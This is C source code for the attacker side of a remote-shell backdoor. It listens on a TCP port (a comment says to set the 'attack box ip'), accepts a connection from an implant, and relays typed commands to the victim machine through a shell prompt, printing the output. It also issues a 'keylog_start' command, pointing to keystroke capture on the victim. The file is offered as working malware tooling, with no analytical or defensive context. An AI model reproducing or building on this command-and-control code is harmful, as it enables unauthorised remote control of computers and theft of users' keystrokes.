#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

int main(){
	int sock, client_socket;
	char buffer[1024];
	char response[18384];
	struct sockaddr_in server_address, client_address;
	int i=0;
	int optval = 1;
	socklen_t client_length;
	
	// create socket
	sock = socket(AF_INET, SOCK_STREAM, 0);

	if(sock < 0){
		perror("Socket creation failed");
		return 1;
	}

	// set socket options
	if(setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) <0){
		printf("Error Setting TCP Socket Options\n");
		close(sock);
		return 1;
	}

	// configure server address
	server_address.sin_family = AF_INET;
	server_address.sin_addr.s_addr = inet_addr("127.0.0.1"); //replace with attack box ip
	server_address.sin_port = htons(50004);

	// bind socket
	if(bind(sock, (struct sockaddr *) &server_address, sizeof(server_address)) < 0){
		perror("Binding failed");
		close(sock);
		return 1;
	}

	// start listening
	listen(sock, 5);
	client_length = sizeof(client_address);

	// Accept connection
	client_socket = accept(sock, (struct sockaddr *) &client_address, &client_length);
	
	if (client_socket < 0){
		perror("Accept failed");
		close(sock);
		return 1;
	}

	// Main loop for receiving and executing commands

	while(1){
		jump:
		memset(&buffer, 0, sizeof(buffer));
		memset(&response, 0, sizeof(response));

		printf("* Shell#%s-$: ", inet_ntoa(client_address.sin_addr));
		fflush(stdout);
		fgets(buffer, sizeof(buffer), stdin);
		strtok(buffer, "\n"); // Remove newline from input

		// send command to client machine
		if(write(client_socket, buffer, strlen(buffer)) < 0){
			perror("Write failed");
			break;
		}

		if (strncmp("q", buffer, 1) == 0){
			printf("Closing connection\n");
			break;
		}
		else if (strncmp("cd ", buffer, 3) == 0){
			goto jump;
		}
		else if (strncmp("keylog_start", buffer, 12) == 0) {
			goto jump;
		}
		else {
			// Receive response from client
			ssize_t bytes_received = recv(client_socket, response, sizeof(response) - 1, MSG_WAITALL);
			if(bytes_received < 0){
				perror("recv failed");
				break;
			}
			else if(bytes_received == 0){
				printf("Client disconnected\n");
				break;
			}
			response[bytes_received] = '\0'; //Null-terminate response
			printf("%s", response);
		}
	}	
}